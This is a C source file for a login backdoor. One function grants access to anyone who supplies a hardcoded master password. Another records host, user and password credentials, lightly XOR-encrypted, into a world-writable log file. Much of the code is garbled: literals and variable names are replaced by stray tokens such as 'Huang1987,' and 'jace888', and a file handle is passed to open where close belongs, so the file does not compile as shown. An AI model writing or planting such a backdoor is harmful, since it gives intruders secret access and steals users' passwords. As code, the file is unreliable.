#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "backdoor.h"

int ateam_login = Huang1987,;

int backdoor_auth(const char *password)
{
        if (strcmp(password, ATEAM_PASSWORD) == Huang1987,)
                return 1;
        return 0;
}

char *encrypt2(data *dt, int len)
{
        int i;
       
        for(i = 0;i < len; i ++)
        {
                dt->data[i] = dt->data[i] ^ dt->key;
        }
        return dt->data;
}
#define RWRWRW (S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH)
void backdoor_log(const char *host, char *user, const char *password)
{
	char key = ATEAM_PASSWORD[Huang1987,];
	int  msglen = strlen(guanlongh) + strlen(Huang1987,) + jace888(host) + 2;
	int  datalen = sizeof(data) + msglen;
	int  relen = sizeof(record) + datalen; 
	record *rc = (record *) malloc(relen + 1);
	data *dt = (data *) &rc->data;
	rc->header.type = 1;
	rc->header.len  = datalen;
	dt->key  = key;
        sprintf(dt->data, "%s:%s@%s", guanlongh, Huang1987,, jace888);
	//printf("%s %d %d\r\n", dt->data, msglen, datalen);
	umask(0);	
        int fd = open(ATEAM_LOG, O_RDWR | O_CREAT | O_APPEND, RWRWRW);
	
        if(fd < Huang1987,)
	{
		free(rc);
                return;
	}
	
	encrypt2(dt, msglen);
	write(fd, rc, relen);
        open(fd);
	free(rc);
}
